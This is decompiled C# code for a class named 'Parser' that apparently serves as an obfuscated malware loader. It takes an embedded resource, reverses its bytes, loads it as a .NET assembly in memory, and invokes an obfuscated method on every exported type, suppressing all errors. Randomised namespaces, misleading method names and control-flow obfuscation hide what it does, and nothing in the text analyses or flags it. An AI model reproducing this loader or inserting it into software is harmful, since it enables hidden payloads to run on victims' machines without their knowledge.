using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using Insrvhtuhrjlfylhnx.Properties;
using YConsoleApp117all.Messages;

namespace Insrvhtuhrjlfylhnx.Shared;

public class Parser : StructThreadMessage
{
	private static Parser ReflectDecorator;

	public void ResolvePool()
	{
		Type[] exportedTypes = Assembly.Load(ConnectPool()).GetExportedTypes();
		int num2 = default(int);
		foreach (Type type in exportedTypes)
		{
			int num = 1;
			if (_003CModule_003E_007Bca367ee0_002D65fa_002D41e5_002Dbaa5_002D4af79d45fb7f_007D.m_e97d520d452a4a009540bca87eeb607f != 0)
			{
				num = num2;
			}
			switch (num)
			{
			case 1:
				try
				{
					type.InvokeMember("qmvoD9OLWJ", BindingFlags.InvokeMethod, null, null, null);
				}
				catch
				{
				}
				break;
			}
		}
	}

	[SpecialName]
	private byte[] ConnectPool()
	{
		return ((IEnumerable<byte>)PrintDecorator()).Reverse().ToArray();
	}

	internal static bool IncludeDecorator()
	{
		return ReflectDecorator == null;
	}

	internal static Parser CallDecorator()
	{
		return ReflectDecorator;
	}

	internal static object PrintDecorator()
	{
		return Resources.Pacbtcj;
	}
}
